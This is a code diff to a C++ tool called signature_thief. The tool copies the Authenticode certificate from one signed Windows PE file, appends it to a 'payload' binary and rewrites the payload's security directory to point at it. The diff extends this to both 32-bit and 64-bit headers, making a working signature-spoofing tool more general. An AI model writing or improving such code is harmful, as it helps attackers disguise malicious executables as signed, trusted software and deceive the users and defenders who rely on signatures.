@@ -33,14 +33,24 @@ void signature_thief::extract_certificate(std::filesystem::path source_path) {
     file.read(reinterpret_cast<char*>(buffer.data()), size);
 
     auto* dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.data());
-    auto* nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(buffer.data() + dos_header->e_lfanew);
+    auto* nt_headers32 = reinterpret_cast<PIMAGE_NT_HEADERS32>(buffer.data() + dos_header->e_lfanew);
 
-    auto& cert_info = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
+    IMAGE_DATA_DIRECTORY* cert_info_ptr = nullptr;
+    if (nt_headers32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
+        cert_info_ptr = &nt_headers32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
+    }
+    else {
+        auto* nt_headers64 = reinterpret_cast<PIMAGE_NT_HEADERS64>(nt_headers32);
+        cert_info_ptr = &nt_headers64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
+    }
+
+    auto& cert_info = *cert_info_ptr;
     if (cert_info.VirtualAddress == 0 || cert_info.Size == 0 || cert_info.VirtualAddress + cert_info.Size > buffer.size()) {
         throw std::runtime_error("No valid certificate found in file: " + source_path.string());
     }
 
-    m_cert.assign(buffer.begin() + cert_info.VirtualAddress, buffer.begin() + cert_info.VirtualAddress + cert_info.Size);
+    m_cert.assign(buffer.begin() + cert_info.VirtualAddress,
+                  buffer.begin() + cert_info.VirtualAddress + cert_info.Size);
 }
 
 void signature_thief::append_certificate_to_payload(std::span<const uint8_t> signature_data) {
@@ -53,11 +63,19 @@ void signature_thief::append_certificate_to_payload(std::span<const uint8_t> sig
 
 void signature_thief::update_pe_header() {
     auto* dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(m_file.data());
-    auto* nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(m_file.data() + dos_header->e_lfanew);
-    auto& cert_info = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
+    auto* nt_headers32 = reinterpret_cast<PIMAGE_NT_HEADERS32>(m_file.data() + dos_header->e_lfanew);
 
-    cert_info.VirtualAddress = static_cast<DWORD>(m_file.size());
-    cert_info.Size = static_cast<DWORD>(m_cert.size());
+    IMAGE_DATA_DIRECTORY* cert_info_ptr = nullptr;
+    if (nt_headers32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
+        cert_info_ptr = &nt_headers32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
+    }
+    else {
+        auto* nt_headers64 = reinterpret_cast<PIMAGE_NT_HEADERS64>(nt_headers32);
+        cert_info_ptr = &nt_headers64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
+    }
+
+    cert_info_ptr->VirtualAddress = static_cast<DWORD>(m_file.size());
+    cert_info_ptr->Size = static_cast<DWORD>(m_cert.size());
 }
 
 int main(int argc, char** argv) {
